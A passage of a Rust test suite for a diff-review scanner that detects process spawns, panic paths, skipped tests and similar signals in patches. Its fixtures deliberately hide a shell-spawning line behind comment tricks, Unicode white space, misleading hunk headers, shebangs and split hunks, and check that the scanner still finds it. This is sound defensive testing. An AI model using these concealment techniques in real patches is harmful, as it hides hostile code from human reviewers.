                (S::ProcessSpawn, Basis::Lexical, 4),
                (S::UnsafeAdded, Basis::Lexical, 5),
                (S::TestSkipped, Basis::Lexical, 9),
                (S::TrivialAssert, Basis::Lexical, 10),
                (S::ProcessSpawn, Basis::Lexical, 11),
                (S::PanicPathAdded, Basis::Lexical, 11),
            ]
        );
        // A raw lifetime is read as editions 2021 and 2024 read it (`rawlt21.rs`: after
        // `'r#r` the quote opens an ordinary string, and the spawn after it is found).
        assert_eq!(
            found(&new_file(
                "src/main.rs",
                &[
                    "macro_rules! m { ($($t:tt)*) => {}; }",
                    "pub fn run() -> bool {",
                    "    m!('r#r\"\\\" /* \"); let s = std::process::Command::new(\"sh\").status(); m!(\" */ \");",
                    "    s.is_ok()",
                    "}",
                ]
            )),
            [(S::ProcessSpawn, Basis::Lexical, 3)]
        );
        // Before edition 2021 `'r#r"\"` is `'r`, `#` and a raw string, and this text
        // (`rawlt-rest.rs`, which editions 2015 and 2018 compile) reads otherwise there. The
        // readings of the compiler's lexer, which follow editions 2021 and 2024, do not find
        // the spawn on line 4. The reading of release 0.8.3 does: its scanner knew no raw
        // lifetime, and took `r"\"` for the raw string it is in the older editions.
        assert_eq!(
            found(&new_file(
                "src/main.rs",
                &[
                    "macro_rules! m { ($($t:tt)*) => {}; }",
                    "m!('r#r\"\\\"); m!(\" /* \");",
                    "pub fn run() -> bool {",
                    "    let s = std::process::Command::new(\"sh\").arg(\"-c\").arg(\"id\").status();",
                    "    s.is_ok()",
                    "}",
                ]
            )),
            [(S::ProcessSpawn, Basis::Lexical, 4)]
        );
    }

    /// Fifth independent review, IR5-M-2. A raw identifier written after one of the compiler's
    /// five white space characters past ASCII (U+0085, U+200E, U+200F, U+2028, U+2029) is the
    /// name it spells: `x.<U+200E>r#unwrap()` calls `unwrap`. The rule that reads `r#name` as
    /// `name` took every character past ASCII before the `r` for part of a longer name, so
    /// the four constructs below left nothing (rustc 1.99.1 compiles the file; it panics and
    /// skips as written).
    #[test]
    fn a_raw_identifier_after_white_space_past_ascii_is_its_name() {
        for white in ['\u{85}', '\u{200e}', '\u{200f}', '\u{2028}', '\u{2029}'] {
            let body = [
                "pub fn first(v: &[u8]) -> u8 {".to_owned(),
                format!("    *v.first().{white}r#unwrap()"),
                "}".to_owned(),
                "pub fn second(v: &[u8]) -> u8 {".to_owned(),
                format!("    *Option::{white}r#unwrap(v.first())"),
                "}".to_owned(),
                "#[cfg(test)]".to_owned(),
                "mod tests {".to_owned(),
                "    #[test]".to_owned(),
                format!("    #[{white}r#ignore]"),
                "    fn skipped() {".to_owned(),
                format!("        {white}r#assert!(true);"),
                "    }".to_owned(),
                "}".to_owned(),
            ];
            let body: Vec<&str> = body.iter().map(String::as_str).collect();
            assert_eq!(
                found(&new_file("src/main.rs", &body)),
                [
                    (S::PanicPathAdded, Basis::Lexical, 2),
                    (S::PanicPathAdded, Basis::Lexical, 5),
                    (S::TestSkipped, Basis::Lexical, 10),
                    (S::TrivialAssert, Basis::Lexical, 12),
                ],
                "U+{:04X}",
                u32::from(white)
            );
        }
        assert_eq!(
            without_raw_prefixes("x.\u{200e}r#unwrap()").as_deref(),
            Some("x.\u{200e}  unwrap()")
        );
        assert_eq!(
            without_raw_prefixes("\u{85}r#ignore").as_deref(),
            Some("\u{85}  ignore")
        );
        // A character past ASCII that is no white space is part of a name, as before, and so
        // is one that only shares bytes with a white space character.
        assert_eq!(without_raw_prefixes("x.\u{e9}r#unwrap()"), None);
        assert_eq!(without_raw_prefixes("x.\u{200d}r#unwrap()"), None);
        assert_eq!(without_raw_prefixes("x.\u{2027}r#unwrap()"), None);
        assert_eq!(without_raw_prefixes("x.\u{84}r#unwrap()"), None);
    }

    /// Fifth independent review, IR5-L-3 (`late2.rs`): a path call that reaches back over
    /// generic arguments on an earlier line is an item for that earlier line, found after
    /// the item of the line it ends on. Both are reported, in line order.
    #[test]
    fn a_path_call_that_reaches_back_a_line_is_reported_in_line_order() {
        assert_eq!(
            found(&new_file(
                "src/lib.rs",
                &[
                    "fn f(x: Option<usize>) {",
                    "    let a = Result::<[u8; {",
                    "        x.unwrap() }], ()>::unwrap;",
                    "}",
                ]
            )),
            [
                (S::PanicPathAdded, Basis::Hunk, 2),
                (S::PanicPathAdded, Basis::Lexical, 3),
            ]
        );
    }

    /// Every item of the first file of `patch`, as the tests name items.
    fn found_in(patch: &str) -> Vec<Item> {
        found(&parse(patch).unwrap().remove(0))
    }

    /// [`found_in`] on the file built by [`unplaced`] (hunks the parser refuses for their place).
    fn found_unplaced(patch: &str) -> Vec<Item> {
        found(&unplaced(patch).remove(0))
    }

    /// The spawn the placement tests hide: one line of Rust that starts a process.
    const SPAWN: &str = r#"pub fn evil() { std::process::Command::new("sh").status().ok(); }"#;

    /// Sixth independent review, IR6-H-1, and the seventh, IR7-L-3. The top of a file is where
    /// Git must put the hunk, and one thing in a header says that it must: an OLD position of
    /// 0 or 1. Plain `git apply` 2.56.0, in scratch repositories.
    ///
    /// Where Git looks for a hunk: it searches for the hunk's old lines starting at the NEW
    /// position and going outward, and takes the nearest place that has them. A file whose
    /// lines 1 to 4 and 9 to 12 are the same four lines, and a hunk of those four lines with
    /// one line added:
    ///
    /// - `@@ -9,4 +1,5 @@`: applied at line 1, with no message. `@@ -2,4 +9,5 @@`: applied at
    ///   line 9, with no message. `@@ -30,4 +6,5 @@`: "Hunk #1 succeeded at 9 (offset 3
    ///   lines)", the nearer of the two places to line 6.
    /// - `@@ -1,4 +9,5 @@` and `@@ -0,4 +9,5 @@`: "Hunk #1 succeeded at 1 (offset -8 lines)".
    ///   Old position 0 or 1 is the beginning, whatever the new position says.
    ///
    /// The same hunk on a file that has the four lines at 9 to 12 only:
    ///
    /// - `@@ -9,4 +1,5 @@` (the sixth review's `lie1.patch`): "succeeded at 9 (offset 8
    ///   lines)". `@@ -40,4 +40,5 @@`: "succeeded at 9 (offset -31 lines)".
    /// - `@@ -1,4 +9,5 @@`: "patch does not apply". Old position 1 must match at the beginning.
    ///
    /// A file of the lines `l1` to `l6`:
    ///
    /// - `@@ -0,2 +1,3 @@` with the context `l4`, `l5`: refused. So must old position 0.
    /// - `@@ -1,0 +2,1 @@` (one added line): refused on a file that has lines, and on an empty
    ///   file "succeeded at 1": with no old line the hunk must match at the beginning and at
    ///   the end, which only an empty file lets it.
    /// - `@@ -0,0 +1,1 @@` on a file that has lines: refused.
    /// - `@@ -3,2 +3,3 @@` with the context `l1`, `l2`: "succeeded at 1 (offset -2 lines)".
    ///   A hunk that says it is lower is put at the top when its old lines are there.
    ///
    /// So a hunk with old position 0 or 1 is at the beginning of its file or not applied, and
    /// a hunk with another old position is wherever its old lines are nearest to its new
    /// position: at the top too, and then nothing in its header says so. (Round 14 wrote
    /// here that the old position decides the place and that "the new position is not used".
    /// The first is true of positions 0 and 1 only, and the second is false: Git starts at
    /// the new position. The rule under test was right and has not changed.)
    #[test]
    fn the_top_of_a_file_is_where_git_must_put_the_hunk() {
        let hunk = |header: &str, body: &str| {
            found_in(&format!(
                "--- a/src/lib.rs\n+++ b/src/lib.rs\n{header}\n{body}"
            ))
        };
        let spawn = |line: u32| vec![(S::ProcessSpawn, Basis::Lexical, line)];
        // `lie1.patch`: a line added inside an existing block comment, in a hunk whose header
        // says `+1`. Its control says `+9`. Both are found: the old position is 9, so
        // neither header says the hunk must be the top.
        let inside = format!(" pub fn h() {{}}\n pub fn i() {{}}\n+// */ {SPAWN} /*\n */\n");
        assert_eq!(hunk("@@ -9,3 +9,4 @@", &inside), spawn(11));
        assert_eq!(hunk("@@ -9,3 +1,4 @@", &inside), spawn(3));
        // `lie2.patch`: the comment is opened by an earlier hunk; one digit of the second
        // header changed from `+10` to `+1`.
        let two = |second: &str| {
            found_in(&format!(
                "--- a/src/lib.rs\n+++ b/src/lib.rs\n@@ -1,3 +1,4 @@\n pub fn a() {{}}\n+/*\n pub fn b() {{}}\n pub fn c() {{}}\n{second}\n pub fn i() {{}}\n pub fn j() {{}}\n+// */ {SPAWN}\n pub fn k() {{}}\n"
            ))
        };
        assert_eq!(two("@@ -9,3 +10,4 @@"), spawn(12));
        assert_eq!(two("@@ -9,3 +1,4 @@"), spawn(3));
        // `lie3.patch`: a line that would be a shebang at the top of a file and is code inside
        // a macro call. With `+1` the shebang rule blanked it (no earlier version did).
        let shebang = "+#! std::process::Command::new(\"sh\").status().ok();\n } }\n";
        assert_eq!(hunk("@@ -6,1 +6,2 @@", shebang), spawn(6));
        assert_eq!(hunk("@@ -6,1 +1,2 @@", shebang), spawn(1));
        // The two header numbers disagree the other way: old position 1, so this is the top
        // of the file whatever the new position says. Nothing is read from inside a comment
        // there: the line is a line comment.
        assert_eq!(hunk("@@ -1,3 +1,4 @@", &inside), []);
        assert_eq!(hunk("@@ -1,3 +9,4 @@", &inside), []);
        // And a first line that is a shebang opens nothing there: `/*` in it is no comment
        // over the code below, whatever the new position says.
        let opener =
            "+#!/usr/bin/env run /*\n+pub fn f() { std::process::Command::new(\"sh\"); }\n l2\n";
        assert_eq!(hunk("@@ -1,1 +1,3 @@", opener), spawn(2));
        assert_eq!(hunk("@@ -1,1 +6,3 @@", opener), spawn(7));
        // A hunk that says it is lower can be the top all the same (the last run above), so
        // a side whose first line is a shebang is read that way too, wherever it says it is.
        // Read from code alone, the line would open a comment over the code below.
        assert_eq!(hunk("@@ -3,1 +3,3 @@", opener), spawn(4));
        // (What stands ON a shebang line is reported in any case: the reading of release
        // 0.8.3, which is kept, takes the line for code.)
        assert_eq!(hunk("@@ -1,1 +1,2 @@", shebang), spawn(1));
    }

    /// The first hunk of a section that creates a file is the top of the file whatever its
    /// header says, and no later hunk of such a section is. `git apply`: a creation whose
    /// headers are `@@ -5,0 +6,2 @@` and `@@ -9,0 +3,1 @@` is accepted ("Hunk #1 succeeded
    /// at 1 (offset -5 lines)") and gives the lines in the order of the patch.
    #[test]
    fn a_created_file_starts_at_its_first_hunk_whatever_the_headers_say() {
        let created = |first: &str, second: &str| {
            unplaced(&format!(
                "diff --git a/src/g.rs b/src/g.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/g.rs\n{first}\n+#!/usr/bin/env run /*\n+fn a() {{}}\n{second}\n+{SPAWN}\n"
            ))
            .remove(0)
        };
        for (first, second) in [
            ("@@ -0,0 +1,2 @@", "@@ -2,0 +3,1 @@"),
            ("@@ -5,0 +6,2 @@", "@@ -9,0 +3,1 @@"),
            ("@@ -0,0 +1,2 @@", "@@ -0,0 +1,1 @@"),
        ] {
            let file = created(first, second);
            // each hunk alone (the second a fragment), and the two as one text from line 1
            assert_eq!(
                texts(&file),
                [
                    Text {
                        hunks: vec![0],
                        top: true
                    },
                    Text {
                        hunks: vec![1],
                        top: false
                    },
                    Text {
                        hunks: vec![0, 1],
                        top: true
                    }
                ],
                "{first} {second}"
            );
            // the shebang on its first line opens no comment, and the spawn is found
            assert_eq!(signals(&file), [S::ProcessSpawn], "{first} {second}");
        }
    }

    /// Sixth independent review, IR6-H-3. Hunks that Git must put one straight after the
    /// other are one text. Plain `git apply` 2.56.0, in scratch repositories (an existing
    /// file has the lines `l1` to `l12`):
    ///
    /// - A created file as `@@ -0,0 +1,2 @@` and `@@ -2,0 +3,1 @@`: accepted, three lines in
    ///   that order. With the second header `@@ -50,0 +90,1 @@`: "Hunk #2 succeeded at 3
    ///   (offset -87 lines)". With `@@ -0,0 +3,1 @@` or `@@ -1,0 +3,1 @@`: refused.
    /// - A hunk of added lines only, `@@ -4,0 +6,1 @@`, after a hunk at lines 3 and 4:
    ///   "Hunk #2 succeeded at 14 (offset 8 lines)". It goes to the END of the file.
    /// - A hunk whose last line is not a context line, in the middle of the file (`l3` and an
    ///   added line): "patch does not apply". It must match at the end.
    /// - `l11`, `l12`, an added line, and then `@@ -3,0 +14,1 @@`: accepted; the line of the
    ///   second hunk is line 14, straight after the added line of the first.
    /// - Two hunks that touch, `@@ -3,2 +3,3 @@` (`l3`, added, `l4`) and `@@ -5,2 +6,3 @@`
    ///   (`l5`, added, `l6`): accepted. The same with the second header `@@ -11,2 +30,3 @@`:
    ///   "Hunk #2 succeeded at 6 (offset -24 lines)". Git looked from line 30 and found the
    ///   lines at 6: neither number of a hunk that has context says where it is (seventh
    ///   independent review, IR7-L-3: the search starts at the new one).
    /// - Hunks in the other order (lines 8 and 9 first, then lines 2 and 3): accepted.
    /// - A second hunk whose first context line is the last context line of the first:
    ///   refused.
    #[test]
    fn hunks_git_must_put_together_are_one_text() {
        let text = |hunks: &[usize]| Text {
            hunks: hunks.to_vec(),
            top: false,
        };
        let existing = |hunks: &str| {
            unplaced(&format!("--- a/src/lib.rs\n+++ b/src/lib.rs\n{hunks}")).remove(0)
        };
        // a hunk that ends the file, and a hunk of added lines: each alone, and the two as
        // one text, whatever the position the second gives
        for second in ["@@ -3,0 +5,1 @@", "@@ -90,0 +9,1 @@"] {
            let file = existing(&format!(
                "@@ -2,2 +2,3 @@\n pub fn b() {{}}\n pub fn c() {{}}\n+pub fn evil(x: Option<u32>) -> u32 {{ x.unwrap\n{second}\n+() }}\n"
            ));
            assert_eq!(
                texts(&file),
                [text(&[0]), text(&[1]), text(&[0, 1])],
                "{second}"
            );
            // `split2.patch`: the call cut in two is read as the call it is, and reported on
            // the line and in the hunk of its first token
            let evidence = file_evidence(&file);
            assert_eq!(found(&file), [(S::PanicPathAdded, Basis::Hunk, 4)]);
            assert_eq!(evidence[0].hunk, file.patch_twin.hunks[0].id);
        }
        // touching hunks, by their old positions: each alone, and the two as one text
        let touching = existing("@@ -3,2 +3,3 @@\n l3\n+a\n l4\n@@ -5,2 +6,3 @@\n l5\n+b\n l6\n");
        assert_eq!(texts(&touching), [text(&[0]), text(&[1]), text(&[0, 1])]);
        // the same with a position that says they do not touch: each on its own
        let apart = existing("@@ -3,2 +3,3 @@\n l3\n+a\n l4\n@@ -11,2 +30,3 @@\n l5\n+b\n l6\n");
        assert_eq!(texts(&apart), [text(&[0]), text(&[1])]);
        // a hunk of added lines that says it stands after the last line of the hunk before
        // it (which has context below its change, so Git need not put it at the end)
        let after = existing("@@ -10,3 +10,4 @@\n l10\n+a\n l11\n l12\n@@ -12,0 +14,1 @@\n+b\n");
        assert_eq!(texts(&after), [text(&[0]), text(&[1]), text(&[0, 1])]);
        // hunks written in the other order touch as well
        let reversed = existing("@@ -5,2 +6,3 @@\n l5\n+b\n l6\n@@ -3,2 +3,3 @@\n l3\n+a\n l4\n");
        assert_eq!(texts(&reversed), [text(&[0]), text(&[1]), text(&[1, 0])]);
        // a hunk Git must put at the top continues nothing
        let top = existing("@@ -5,1 +6,2 @@\n l5\n+b\n@@ -1,2 +1,3 @@\n l1\n+a\n l2\n");
        assert_eq!(
            texts(&top),
            [
                text(&[0]),
                Text {
                    hunks: vec![1],
                    top: true
                }
            ]
        );
        // however many hunks touch, each is read alone and all of them once as one text (a
        // run that several rules make is kept once; a hunk stands in at most seven texts)
        let many = existing(&(0..20).fold(String::new(), |mut hunks, n| {
            let _ = writeln!(hunks, "@@ -{},2 +{},3 @@\n x\n+y\n z", 3 + 2 * n, 3 + 3 * n);
            hunks
        }));
        assert_eq!(texts(&many).len(), 21);
        assert_eq!(texts(&many)[20].hunks, (0..20).collect::<Vec<_>>());
        assert_eq!(joined_hunks(&many), [true; 20]);
        // a hunk Git must put after one that the positions join to an earlier one: alone,
        // with the hunk before it, and with both
        let three = existing(
            "@@ -3,2 +3,3 @@\n l3\n+a\n l4\n@@ -5,1 +6,2 @@\n l5\n+b\n@@ -9,0 +9,1 @@\n+c\n",
        );
        assert_eq!(
            texts(&three),
            [
                text(&[0]),
                text(&[1]),
                text(&[2]),
                text(&[1, 2]),
                text(&[0, 1, 2]),
                // and by the numbers alone, for an applier that puts the third where its
                // numbers say and not at the end of the file
                text(&[0, 1])
            ]
        );
    }

    /// No join takes a reading away: a hunk is always read on its own as well. Round 14 as
    /// first built read a hunk that Git must put after another only as its continuation, and
    /// lost what round 13 found in this patch. It is the shape of every `git diff -U0` patch:
    /// hunks of added lines only, in an existing file. Plain `git apply` puts both hunks at
    /// the end of the file one after the other ("Hunk #1 succeeded at 23 (offset 17 lines).
    /// Hunk #2 succeeded at 25 (offset 2 lines)."), where the second stands inside the
    /// comment the first opens. `git apply --unidiff-zero`, which is how such a patch is
    /// applied, puts each where its numbers say: the comment closes on a line of the file
    /// the patch does not show, the second hunk is code, and rustc 1.99.1 compiles the
    /// result. Both readings are made, and what either finds is found.
    #[test]
    fn a_join_takes_no_reading_away() {
        let file = unplaced(
            "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -5,0 +6,2 @@ pub fn a() -> u32 {\n+    let x = Some(1); /* note\n+    let y = 2;\n@@ -20,0 +23,2 @@ pub fn b() -> u32 {\n+    std::process::Command::new(\"sh\").status().ok();\n+    let z = q.unwrap();\n",
        )
        .remove(0);
        let text = |hunks: &[usize]| Text {
            hunks: hunks.to_vec(),
            top: false,
        };
        assert_eq!(texts(&file), [text(&[0]), text(&[1]), text(&[0, 1])]);
        assert_eq!(
            found(&file),
            [
                (S::ProcessSpawn, Basis::Lexical, 23),
                (S::PanicPathAdded, Basis::Lexical, 24),
            ]
        );
        // A hunk of added lines with old position 1 is no top of a file either:
        // `--unidiff-zero` puts it after line 1 (plain `git apply` refuses it unless the
        // file is empty). Here line 1 opens a comment, and the added line is a call.
        assert_eq!(
            found_unplaced(&format!(
                "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,0 +2,1 @@\n+// */ {SPAWN} /*\n"
            )),
            [(S::ProcessSpawn, Basis::Lexical, 2)]
        );
        // And it loses nothing the top of a file has: on an empty file plain `git apply`
        // puts it at line 1, where a first line that is a shebang opens nothing.
        assert_eq!(
            found_unplaced(&format!(
                "--- a/src/a.rs\n+++ b/src/a.rs\n@@ -1,0 +1,2 @@\n+#!/usr/bin/env run /*\n+{SPAWN}\n"
            )),
            [(S::ProcessSpawn, Basis::Lexical, 2)]
        );
    }

    /// The same as a property: for every hunk of a file, whatever its other hunks are and
    /// however they are joined, what the hunk gives when it is read alone is among what the
    /// file gives for it. Generated text (comments that nest, quotes, raw strings, calls)
    /// cut into hunks four ways: a created file in several hunks, hunks of added lines only
    /// in an existing file, hunks that touch by their positions, and hunks apart.
    #[test]
    fn what_a_hunk_gives_alone_is_among_what_its_file_gives() {
        const PIECES: [&str; 20] = [
            "/*",
            "*/",
            "\"",
            "//",
            "r#\"",
            "\"#",
            "\n",
            "\n",
            "\n",
            " ",
            "x.unwrap()",
            "unsafe",
            "std::process::Command::new(\"sh\")",
            "#[test]",
            "#[ignore]",
            "todo!()",
            "fn t() {",
            "}",
            "assert!(true);",
            "'",
        ];
        let mut seed = 0x2026_1115_u64;
        let mut next = move || {
            seed = seed
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            (seed >> 33) as usize
        };
        let mut joined = 0;
        for case in 0..1500 {
            let text: String = (0..6 + next() % 40)
                .map(|_| PIECES[next() % PIECES.len()])
                .collect();
            let lines: Vec<&str> = text.split('\n').collect();
            let cut = 1 + next() % lines.len().max(2).min(lines.len());
            let parts = [
                &lines[..cut.min(lines.len())],
                &lines[cut.min(lines.len())..],
            ];
            let shape = case % 4;
            let mut patch = if shape == 0 {
                "diff --git a/src/a.rs b/src/a.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/a.rs\n".to_owned()
            } else {
                "--- a/src/a.rs\n+++ b/src/a.rs\n".to_owned()
            };
            let (mut old, mut new) = (if shape == 0 { 0 } else { 4 }, 1);
            for (which, part) in parts.iter().enumerate() {
                if part.is_empty() {
                    continue;
                }
                // 0 and 1: added lines only; 2: a context line below, the next hunk straight
                // after it; 3: the same with a gap
                let context = usize::from(shape >= 2);
                if which == 1 && shape == 3 {
                    old += 7;
                    new += 7;
                }
                let start = if context == 1 { old + 1 } else { old };
                let _ = writeln!(
                    patch,
                    "@@ -{start},{context} +{},{} @@",
                    new + usize::from(shape != 0 || which == 1) * usize::from(context == 0),
                    part.len() + context
                );
                for line in *part {
                    let _ = writeln!(patch, "+{line}");
                }
                if context == 1 {
                    patch.push_str(" below\n");
                }
                old += context;
                new += part.len() + context;
            }
            let file = unplaced(&patch).remove(0);
            let kind = FileKind::readings(&file).remove(0);
            let rules: Vec<&Rule> = RULES.iter().filter(|r| kind.admits(r.scope)).collect();
            let hunks = &file.patch_twin.hunks;
            joined += joined_hunks(&file).iter().filter(|joined| **joined).count();
            let of_file = file_evidence(&file);
            for (index, hunk) in hunks.iter().enumerate() {
                let lines: Vec<&PatchLine> = hunk.lines.iter().collect();
                let top = placed_at_top(file.status, hunk, index == 0);
                let alone = unite(
                    &text_hits(&lines, top, kind.language, &rules),
                    &released_hits(hunk, &kind.legacy_rules()),
                );
                for hit in &alone {
                    assert!(
                        of_file.iter().any(|e| e.hunk == hunk.id
                            && (e.signal, e.side, e.line) == (hit.signal, hit.side, hit.number)),
                        "case {case}: {:?} on line {} of hunk {index} read alone is not in the file's answer: {patch:?}",
                        hit.signal,
                        hit.number
                    );
                }
            }
        }
        // the cases do join hunks: the property is not held by an absence of joins
        assert!(joined > 1000, "{joined}");
    }

    /// What release 0.8.3 listed for a hunk, made as it made it: the hunk alone, by its
    /// scanner and its rules for a Rust file, and for any other by the shared scanner and
    /// the rules of the signals it had.
    fn listed_by_release_0_8_3(file: &ReviewFile) -> Vec<(HunkId, Side, S, u32)> {
        // the language as that release decided it (`FileKind::of` at commit `d4dbc91`): by
        // the extension, or by a shebang on the first line of the new side of the first
        // hunk when its header says that side starts at line 1
        let first_line = file
            .patch_twin
            .hunks
            .first()
            .filter(|h| h.new_start == Some(1))
            .and_then(|h| h.lines.iter().find(|l| l.kind != PatchLineKind::Removed))
            .map(|l| l.text.as_str());
        let kind = FileKind::with(&file.path, Language::of(&file.path, first_line));
        let mut listed = Vec::new();
        for hunk in &file.patch_twin.hunks {
            let hits = if kind.language == Some(Language::Rust) {
                legacy_hits(hunk, &kind.legacy_rules(), &legacy_views(hunk))
            } else {
                let rules: Vec<&Rule> = RULES
                    .iter()
                    .filter(|r| kind.admits(r.scope) && r.signal.in_release_0_8_3())
                    .collect();
                let lines: Vec<&PatchLine> = hunk.lines.iter().collect();
                text_hits(&lines, false, kind.language, &rules)
            };
            listed.extend(
                hits.iter()
                    .map(|hit| (hunk.id, hit.side, hit.signal, hit.number)),
            );
        }
        listed
    }

    /// An item of a signal release 0.8.3 had is not thereby an item that release reported:
    /// it read every hunk alone. Here the second hunk of a created Python file, read alone,
    /// opens a string where the file closes one, and the call after it is found only in the
    /// file read as one text. The first call both find.
    #[test]
    fn an_item_only_a_join_finds_is_not_one_the_release_reported() {
        let file = unplaced(
            "diff --git a/tool.py b/tool.py\nnew file mode 100644\n--- /dev/null\n+++ b/tool.py\n@@ -0,0 +1,2 @@\n+os.system(a)\n+NOTE = \"\"\"\n@@ -2,0 +3,2 @@\n+text \"\"\"\n+os.system(b)\n",
        )
        .remove(0);
        let found: Vec<(S, u32, bool)> = file_evidence(&file)
            .iter()
            .map(|item| (item.signal, item.line, item.released))
            .collect();
        assert_eq!(
            found,
            [(S::ProcessSpawn, 1, true), (S::ProcessSpawn, 4, false)]
        );
        assert_eq!(listed_by_release_0_8_3(&file).len(), 1);
    }

    /// A patch of one file with many items, for case `case` of a generated series: a Rust
    /// file or a Python one, created in one hunk, created in two, or changed by two hunks of
    /// added lines; every fifth with many items of one signal release 0.8.3 did not have and
    /// one line of any kind at the end.
    fn patch_with_many_items(case: usize, next: &mut impl FnMut() -> usize) -> String {
        const RUST: [&str; 14] = [
            "std::process::Command::new(\"sh\");",
            "x.unwrap();",
            "x.unwrap();",
            "unsafe { f() }",
            "todo!();",
            "reqwest::get(u);",
            "#[allow(dead_code)]",
            "/* /* */ // */ ureq::get(u);",
            "/*",
            "*/",
            "let s = \"",
            "\";",
            "fn f() {}",
            "// note",
        ];
        const PYTHON: [&str; 10] = [
            "os.system(a)",
            "assert True",
            "assert True",
            "eval(x)",
            "requests.get(u)",
            "raise NotImplementedError",
            "NOTE = \"\"\"",
            "text \"\"\"",
            "x = 1  # noqa",
            "# note",
        ];
        let (name, lines) = if case.is_multiple_of(2) {
            ("src/a.rs", &RUST[..])
        } else {
            ("tool.py", &PYTHON[..])
        };
        // every fifth: many items of one signal that release did not have, and one line
        // of any kind at the end
        let many = case % 5 == 4;
        let length = 20 + next() % 90;
        let text: Vec<&str> = (0..length)
            .map(|at| {
                if many && at + 1 < length {
                    lines[1]
                } else {
                    lines[next() % lines.len()]
                }
            })
            .collect();
        let shape = (case / 2) % 3;
        let cut = if shape == 0 {
            text.len()
        } else {
            1 + next() % (text.len() - 1)
        };
        let mut patch = if shape == 2 {
            format!("--- a/{name}\n+++ b/{name}\n")
        } else {
            format!(
                "diff --git a/{name} b/{name}\nnew file mode 100644\n--- /dev/null\n+++ b/{name}\n"
            )
        };
        let mut new = 1;
        for (which, part) in [&text[..cut], &text[cut..]].iter().enumerate() {
            if part.is_empty() {
                continue;
            }
            // a created file: `-0,0` and then the line before; an existing one: two
            // hunks of added lines, apart
            let old = match (shape == 2, which) {
                (false, 0) => 0,
                (false, _) => new - 1,
                (true, _) => 40 + 30 * which,
            };
            if shape == 2 {
                new = old + 1 + which * cut;
            }
            let _ = writeln!(patch, "@@ -{old},0 +{new},{} @@", part.len());
            for line in *part {
                let _ = writeln!(patch, "+{line}");
            }
            new += part.len();
        }
        patch
    }

    /// The bounded list of a file holds every item release 0.8.3 listed for it, as a
    /// property over generated files with many items: Rust and Python, created in one hunk,
    /// created in several, and changed by hunks of added lines. Also held: the items marked
    /// as that release's are exactly its items; the list is in the file's order and as long
    /// as the bound allows; and where there is room, every signal of the file has an item
    /// in the list. (Review of the released line's fix, VLF3-L-1: the list was the first 32
    /// of all items, and one item of a new reading on line 1 pushed out the last of 32 that
    /// release listed.)
    #[test]
    fn what_release_0_8_3_listed_is_in_the_bounded_list() {
        let mut seed = 0x2026_1115_0032_u64;
        let mut next = move || {
            seed = seed
                .wrapping_mul(6_364_136_223_846_793_005)
                .wrapping_add(1_442_695_040_888_963_407);
            (seed >> 33) as usize
        };
        let (mut cut_short, mut pushed, mut placed) = (0, 0, 0);
        for case in 0..1200 {
            let patch = patch_with_many_items(case, &mut next);
            let file = unplaced(&patch).remove(0);
            let key = |item: &Evidence| (item.hunk, item.side, item.signal, item.line);
            let all = file_evidence(&file);
            let ranked = crate::rank::RankedFile::scored(&file);
            let list: Vec<_> = ranked.evidence.iter().map(key).collect();
            let released = listed_by_release_0_8_3(&file);
            // the mark is that release's answer, item for item and in its order
            assert_eq!(
                all.iter()
                    .filter(|item| item.released)
                    .map(key)
                    .collect::<Vec<_>>(),
                released,
                "case {case}: {patch:?}"
            );
            // what it printed is printed
            for item in released.iter().take(MAX_EVIDENCE_PER_FILE) {
                assert!(list.contains(item), "case {case}: {item:?} of {patch:?}");
            }
            // the list is as long as the bound allows and in the file's order
            assert_eq!(list.len(), all.len().min(MAX_EVIDENCE_PER_FILE), "{case}");
            assert_eq!(ranked.evidence_truncated, all.len() > list.len(), "{case}");
            let mut rest = all.iter().map(key);
            assert!(
                list.iter().all(|item| rest.any(|other| other == *item)),
                "case {case}: not in the file's order: {patch:?}"
            );
            // where the release's items leave room for it, every signal has a place
            let signals: std::collections::BTreeSet<S> =
                all.iter().map(|item| item.signal).collect();
            if released.len() + signals.len() <= MAX_EVIDENCE_PER_FILE {
                for signal in &signals {
                    assert!(
                        list.iter().any(|item| item.2 == *signal),
                        "case {case}: no place for {signal:?}: {patch:?}"
                    );
                }
                placed += usize::from(
                    signals
                        .iter()
                        .any(|signal| !all.iter().take(32).any(|item| item.signal == *signal)),
                );
            }
            cut_short += usize::from(ranked.evidence_truncated);
            pushed += usize::from(
                released
                    .iter()
                    .take(MAX_EVIDENCE_PER_FILE)
                    .any(|item| !all.iter().take(32).map(key).any(|other| other == *item)),
            );
        }
        // the cases are of the kind that matters: lists cut short, items of the release that
        // the first 32 of all items would have left out, and signals they would have left
        // with no place
        assert!(
            cut_short > 300 && pushed > 200 && placed > 40,
            "{cut_short} {pushed} {placed}"
        );
    }

    /// A construct cut in two by a hunk boundary, and a comment carried over one, are read as
    /// in the same lines written as one hunk (sixth independent review, IR6-H-3: `split4`,
    /// `newfile-depth1`, `newfile-depth2` and `newfile-depth1-lie`, against `joined1` and
    /// `newfile-depth2-joined`). Until 2026-11-14 each hunk was read alone, in the released
    /// version 0.8.3 too.
    #[test]
    fn a_file_created_as_several_hunks_is_read_as_the_file_it_is() {
        let created = |hunks: &str| {
            found_unplaced(&format!(
                "diff --git a/src/lib.rs b/src/lib.rs\nnew file mode 100644\n--- /dev/null\n+++ b/src/lib.rs\n{hunks}"
            ))
        };
        // `split4.patch` and the same lines as one hunk
        let call = [(S::PanicPathAdded, Basis::Hunk, 2)];
        let cut = "@@ -0,0 +1,2 @@\n+pub fn a() {}\n+pub fn evil(x: Option<u32>) -> u32 { x.unwrap\n@@ -2,0 +3,1 @@\n+() }\n";
        let whole = "@@ -0,0 +1,3 @@\n+pub fn a() {}\n+pub fn evil(x: Option<u32>) -> u32 { x.unwrap\n+() }\n";
        assert_eq!(created(cut), call);
        assert_eq!(created(whole), call);
        // a block comment opened in the first hunk and closed in the second: one deep
        // (`newfile-depth1`), two deep (`newfile-depth2`), and with a second header that
        // says `+1` (`newfile-depth1-lie`: the line number is the header's word)
        let spawn = |line: u32| vec![(S::ProcessSpawn, Basis::Lexical, line)];
        assert_eq!(
            created(&format!(
                "@@ -0,0 +1,2 @@\n+//! Helpers.\n+/*\n@@ -2,0 +3,2 @@\n+// */ {SPAWN}\n+pub fn k() {{}}\n"
            )),
            spawn(3)
        );
        assert_eq!(
            created(&format!(
